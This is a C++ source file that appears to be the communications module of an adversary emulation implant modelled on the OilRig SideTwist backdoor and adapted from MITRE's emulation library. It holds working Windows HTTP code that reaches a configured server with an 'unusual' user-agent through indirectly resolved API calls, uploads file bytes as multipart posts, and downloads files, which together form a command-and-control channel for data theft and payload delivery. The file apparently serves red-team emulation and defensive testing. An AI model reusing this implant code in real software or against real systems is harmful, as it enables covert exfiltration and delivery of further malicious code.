#include "comms.h"

/**
* Retooled from MITRE implementation: https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/master/oilrig/Resources/SideTwist/SideTwist/src/comms.cpp
* Sends a HTTP request and returns the response as a vector of bytes.
*   requestType: must be an all caps HTTP verb.
*   data: can be empty (e.g. when making GET's).
*   headers: can be empty; Each header except the last must be terminated by a carriage return/line feed (CR/LF).
* 
* Sources:
* - None, inferred capability but no substantive implementation details
*/
vector<char> sendRequest(LPCWSTR requestType, vector<char> bytes, wstring headers,
    int port, wstring host, wstring endpoint) {
    DWORD dwSize = 0;
    DWORD dwBytesRead = 0;
    LPSTR pszDataBuffer = { 0 };
    BOOL  bResponseSuccess = FALSE;
    BOOL  bRequestSuccess = FALSE;
    HINTERNET  hSession = NULL,
        hConnect = NULL,
        hRequest = NULL;

    wstring endpointPath = wstring(endpoint.begin(), endpoint.end());

    // Obtain a session handle (using an 'unusual' user-agent)
    hSession = g_racWinHttpOpen(g_userAgent.c_str(), WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);

    // Try to connect over the requested port
    if (hSession) {
        hConnect = g_racWinHttpConnect(hSession, host.c_str(), port, 0);
    }

    // Obtain a request handle
    if (hConnect) {
        hRequest = g_racWinHttpOpenRequest(hConnect, requestType, endpointPath.c_str(),
            NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    }

    // Add headers
    if ((hRequest) && (!headers.empty())) {
        if (!g_racWinHttpAddRequestHeaders(hRequest, headers.c_str(), headers.length(),
            WINHTTP_ADDREQ_FLAG_COALESCE)) {
            wcout << headers;
            return vector<char>();
        }
    }

    // Send the request
    if (hRequest) {
        bRequestSuccess = g_racWinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
            bytes.data(), bytes.size(), bytes.size(), 0);
    }

    // Start the receive process
    if (bRequestSuccess) {
        bResponseSuccess = g_racWinHttpReceiveResponse(hRequest, NULL);
    }
    else {
        //printf("Error %d has occurred sending the HTTP request.\n", g_racGetLastError());
        return vector<char>();
    }

    vector<char> receivedData = vector<char>();
    // Keep checking for data until there is nothing left.
    if (bResponseSuccess) {
        //check for 200 code
        DWORD status = 0;
        DWORD len = sizeof(status);
        bool bStatus = g_racWinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
            NULL, &status, &len, NULL);
        if (status != (DWORD)200) {
            printf("%u\n", status);
            return vector<char>();
        }
        do {
            // Check for available data
            dwSize = 0;
            if (!g_racWinHttpQueryDataAvailable(hRequest, &dwSize)) {
                //printf("Error %u in WinHttpQueryDataAvailable.\n", g_racGetLastError());
            }
            // Allocate space for the buffer
            pszDataBuffer = new char[dwSize + 1];
            if (!pszDataBuffer) {
                //printf("Out of memory while reading HTTP response\n");
                dwSize = 0;
            }
            else {
                // Read the data
                ZeroMemory(pszDataBuffer, dwSize + 1);

                if (!g_racWinHttpReadData(hRequest, (LPVOID)pszDataBuffer, dwSize, &dwBytesRead)) {
                    //printf("Error %u in WinHttpReadData.\n", GetLastError());
                }
                else {
                    receivedData.insert(receivedData.end(), pszDataBuffer, pszDataBuffer + dwSize);
                }
                // Free the memory allocated to the buffer.
                delete[] pszDataBuffer;
            }
        } while (dwSize > 0);
    }
    else
    {
        //printf("Error %d has occurred obtaining the HTTP response.\n", GetLastError());
        return vector<char>();
    }

    // Close any open handles.
    if (hRequest) g_racWinHttpCloseHandle(hRequest);
    if (hConnect) g_racWinHttpCloseHandle(hConnect);
    if (hSession) g_racWinHttpCloseHandle(hSession);

    return receivedData;
}

/**
* Sends a file to the server as a multi-part file upload
* 
* Sources:
* - None, inferred capability but no substantive implementation details
*/
int sendMultipartUpload(vector<char> fileBytes, wstring filename, wstring token) {
    vector<char> requestData;
    wstring multipartBoundary = randString(16);
    wstring wstr = g_doubleDash + multipartBoundary + g_newLineChar;
    wstr += g_content_disposition + filename + g_quote + g_newLineChar;
    wstr += g_content_type;
    wstr += g_newLineChar;
    appendWStringToVector(requestData, wstr);
    appendBytesToVector(requestData, fileBytes.data(), fileBytes.size());
    wstr = g_newLineChar + g_doubleDash + multipartBoundary + g_doubleDash + g_newLineChar;
    appendWStringToVector(requestData, wstr);

    wstring headers = g_content_type_2 + multipartBoundary + g_quote;
    headers += g_cache_control;

    vector<char> resp = sendRequest(g_POST.c_str(), requestData, headers, g_port, g_server, token);

    // Return 0 only if server responds as expected.
    if (wstring(resp.begin(), resp.end()) == g_recieved) {
        return 0;
    }
    return 1;
}

/**
* Download a file from the server as bytes
* 
* Sources:
* - None, inferred capability but no substantive implementation details
*/
vector<char> downloadFile(wstring endpoint) {
    return sendRequest(g_GET.c_str(), vector<char>(), L"", g_port, g_server, endpoint);
}